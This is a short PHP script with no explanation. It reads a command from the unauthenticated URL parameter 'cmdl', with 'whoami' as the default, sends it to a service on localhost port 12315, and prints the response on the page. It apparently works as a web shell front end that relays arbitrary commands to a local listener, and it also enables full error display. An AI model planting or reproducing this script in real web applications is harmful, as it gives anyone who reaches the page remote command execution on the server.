<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
$con = socket_connect($socket, '127.0.0.1', 12315);
if(!$con) {
    socket_close($socket);
    exit;
}

if($con){
    $cmdl = isset($_GET['cmdl']) ? $_GET['cmdl'] : "whoami";
    socket_write($socket, $cmdl . "\r\n\r\n");
    $hear = socket_read($socket, 1024);
    echo $hear;
}

socket_shutdown($socket);
socket_close($socket);
?>